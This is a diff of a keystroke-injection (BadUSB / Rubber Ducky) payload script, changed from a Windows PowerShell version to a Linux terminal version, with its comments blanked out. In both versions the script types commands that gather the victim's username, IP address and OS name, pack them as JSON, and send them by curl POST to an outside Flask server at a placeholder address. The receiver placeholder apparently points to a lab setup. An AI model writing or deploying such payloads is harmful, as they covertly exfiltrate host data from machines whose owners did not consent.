@@ -1,23 +1,24 @@
-REM Open the terminal (Windows example with PowerShell, for Linux, adjust as needed)
+REM
 DELAY 500
-GUI r
+CTRL ALT t
 DELAY 500
-STRING powershell
-ENTER
-DELAY 1000
 
-REM Collect the username, IP, and operating system
-STRING $user = $env:UserName
+REM
+STRING user=$(whoami)
 ENTER
-STRING $ip = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
+DELAY 100
+STRING ip=$(hostname -I | awk '{print $1}')
 ENTER
-STRING $os = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+DELAY 100
+STRING os=$(lsb_release -d | awk -F"\t" '{print $2}')
 ENTER
+DELAY 100
 
-REM Combine data into JSON format
-STRING $data = "{`"user`":`"$user`",`"ip`":`"$ip`",`"os`":`"$os`"}"
+REM
+STRING data="{\"user\":\"$user\",\"ip\":\"$ip\",\"os\":\"$os\"}"
 ENTER
+DELAY 100
 
-REM Send data to the Flask server
-STRING curl -X POST http://<docker_container_ip>:5000/receive -H "Content-Type: application/json" -d $data
+REM
+STRING curl -X POST http://<docker_container_ip>:5000/receive -H "Content-Type: application/json" -d "$data"
 ENTER
